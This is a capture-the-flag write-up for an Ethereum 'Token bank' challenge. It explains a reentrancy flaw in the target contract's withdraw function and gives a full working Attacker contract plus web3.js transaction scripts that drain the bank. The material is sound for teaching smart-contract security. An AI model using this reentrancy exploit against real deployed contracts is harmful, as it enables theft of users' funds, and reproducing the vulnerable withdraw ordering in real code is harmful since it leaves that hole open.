# 19. Token bank

I created a token bank. It allows anyone to deposit tokens by transferring them to the bank and then to withdraw those tokens later. It uses ERC 223 to accept the incoming tokens.

The bank deploys a token called “Simple ERC223 Token” and assigns half the tokens to me and half to you. You win this challenge if you can empty the bank.

## Target contract

```solidity
pragma solidity ^0.4.21;

interface ITokenReceiver {
    function tokenFallback(address from, uint256 value, bytes data) external;
}

contract SimpleERC223Token {
    // Track how many tokens are owned by each address.
    mapping (address => uint256) public balanceOf;

    string public name = "Simple ERC223 Token";
    string public symbol = "SET";
    uint8 public decimals = 18;

    uint256 public totalSupply = 1000000 * (uint256(10) ** decimals);

    event Transfer(address indexed from, address indexed to, uint256 value);

    function SimpleERC223Token() public {
        balanceOf[msg.sender] = totalSupply;
        emit Transfer(address(0), msg.sender, totalSupply);
    }

    function isContract(address _addr) private view returns (bool is_contract) {
        uint length;
        assembly {
            //retrieve the size of the code on target address, this needs assembly
            length := extcodesize(_addr)
        }
        return length > 0;
    }

    function transfer(address to, uint256 value) public returns (bool success) {
        bytes memory empty;
        return transfer(to, value, empty);
    }

    function transfer(address to, uint256 value, bytes data) public returns (bool) {
        require(balanceOf[msg.sender] >= value);

        balanceOf[msg.sender] -= value;
        balanceOf[to] += value;
        emit Transfer(msg.sender, to, value);

        if (isContract(to)) {
            ITokenReceiver(to).tokenFallback(msg.sender, value, data);
        }
        return true;
    }

    event Approval(address indexed owner, address indexed spender, uint256 value);

    mapping(address => mapping(address => uint256)) public allowance;

    function approve(address spender, uint256 value)
        public
        returns (bool success)
    {
        allowance[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
        return true;
    }

    function transferFrom(address from, address to, uint256 value)
        public
        returns (bool success)
    {
        require(value <= balanceOf[from]);
        require(value <= allowance[from][msg.sender]);

        balanceOf[from] -= value;
        balanceOf[to] += value;
        allowance[from][msg.sender] -= value;
        emit Transfer(from, to, value);
        return true;
    }
}

contract TokenBankChallenge {
    SimpleERC223Token public token;
    mapping(address => uint256) public balanceOf;

    function TokenBankChallenge(address player) public {
        token = new SimpleERC223Token();

        // Divide up the 1,000,000 tokens, which are all initially assigned to
        // the token contract's creator (this contract).
        balanceOf[msg.sender] = 500000 * 10**18;  // half for me
        balanceOf[player] = 500000 * 10**18;      // half for you
    }

    function isComplete() public view returns (bool) {
        return token.balanceOf(this) == 0;
    }

    function tokenFallback(address from, uint256 value, bytes) public {
        require(msg.sender == address(token));
        require(balanceOf[from] + value >= balanceOf[from]);

        balanceOf[from] += value;
    }

    function withdraw(uint256 amount) public {
        require(balanceOf[msg.sender] >= amount);

        require(token.transfer(msg.sender, amount));
        balanceOf[msg.sender] -= amount;
    }
}
```

## Vulnerability

This is a simple rentrency vulnerability in :

```solidity
    function withdraw(uint256 amount) public {
        require(balanceOf[msg.sender] >= amount);

        require(token.transfer(msg.sender, amount));
        balanceOf[msg.sender] -= amount;
    }
```

The CHECK - EFFECTS - INTERACTION pattern dictates that the effect `balanceOf[msg.sender] -= amount;` should happen before any interaction `require(token.transfer(msg.sender, amount));`. As `token.transfer(msg.sender, amount)` will potentially call `tokenFallback(address from, uint256 value, bytes data)` on the receiving address if it is a smart contract we can easily design one that initiates a withdrawal, and calls `withdraw` a second time when its `tokenFallback` function is called.

Now, in order to pass the `require(token.transfer(msg.sender, amount));` in `withdraw` we must make sure that we own the tokens from the token contract perspective, let's withdraw them first :

```js
const challengeContract = "0xD8Fe917280D25DF9550F6C94ad395399CCD8e59B";

const data = web3.eth.abi.encodeFunctionCall(
  {
    name: "withdraw",
    type: "function",
    inputs: [{ type: "uint256", name: "amount" }],
  },
  ["500000000000000000000000"]
);

await web3.eth.sendTransaction({
  from: accounts[0],
  to: challengeContract,
  data: data,
});
```

At this point, the challenge contract assumes we have 0 balance, and the token contract considers that our personal address hold a balance of `500000000000000000000000`.
Since we need to rely on smart contract for the attack, we must transfer that balance to our adversarial smart contract which will in turn deposit that to the challenge contract. Let's first design and deploy that one. We only need to make sure than when the contract received our balance it wont start the attack straight away as its `tokenFallback` method will be called, so we protect it with an `enabled` boolean variable. Additionally, we control how many rentrency attack we want to do through a second variable `called`, we only need to withdraw twice so a boolean will do.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
pragma abicoder v1;

interface ITokenBankChallenge {
    function withdraw(uint256 amount) external;
}

interface ISimpleERC223Token {
    function transfer(address to, uint256 value) external returns (bool success);
}

contract Attacker {
    
    ISimpleERC223Token tokenContract;
    ITokenBankChallenge challengeContract;
    bool called;
    bool enabled;

    constructor(ISimpleERC223Token _tokenContract, ITokenBankChallenge _challengeContract) {
        tokenContract = _tokenContract;
        challengeContract = _challengeContract;
    }

    function enable() public {
        require(tokenContract.transfer(address(challengeContract), 500000 * 10**18) == true);
        enabled = true;
    }

    function attack() public {
        challengeContract.withdraw(500000 * 10**18);
    }

     function tokenFallback(address from, uint256 value, bytes memory data) external {
         if (enabled == true && called == false) {
             called = true;
             attack();
         }
     }
}
```

Deploy that contract by giving it the address of the challenge contract and token contract as aparameter.
We can now send our personal balance to that adversarial contract :


```js
const challengeContract = "0xD8Fe917280D25DF9550F6C94ad395399CCD8e59B";
const adversarialContract = "0x023499f69eAe122cc81fFDC75818Bf317Ff2eCA9";
const tokenContract = "0x" + (await web3.eth.getStorageAt(challengeContract, 0)).slice(-40);

const data = web3.eth.abi.encodeFunctionCall(
  {
    name: "transfer",
    type: "function",
    inputs: [
      { type: "address", name: "to" },
      { type: "uint256", name: "amount" },
    ],
  },
  [adversarialContract, "500000000000000000000000"]
);

await web3.eth.sendTransaction({
  from: accounts[0],
  to: tokenContract,
  data: data,
})
```

And enable it : 

```js
const adversarialContract = "0x023499f69eAe122cc81fFDC75818Bf317Ff2eCA9";

const data = web3.eth.abi.encodeFunctionCall(
  {
    name: "enable",
    type: "function",
    inputs: [],
  },
  []
);

await web3.eth.sendTransaction({
  from: accounts[0],
  to: adversarialContract,
  data: data,
});
```

We can now start the attack that will be able to withdraw twice through the rentrency attack :

```js
const data = web3.eth.abi.encodeFunctionCall(
  {
    name: "attack",
    type: "function",
    inputs: [],
  },
  []
);

await web3.eth.sendTransaction({
  from: accounts[0],
  to: adversarialContract,
  data: data,
});
```

You can now submit the challenge !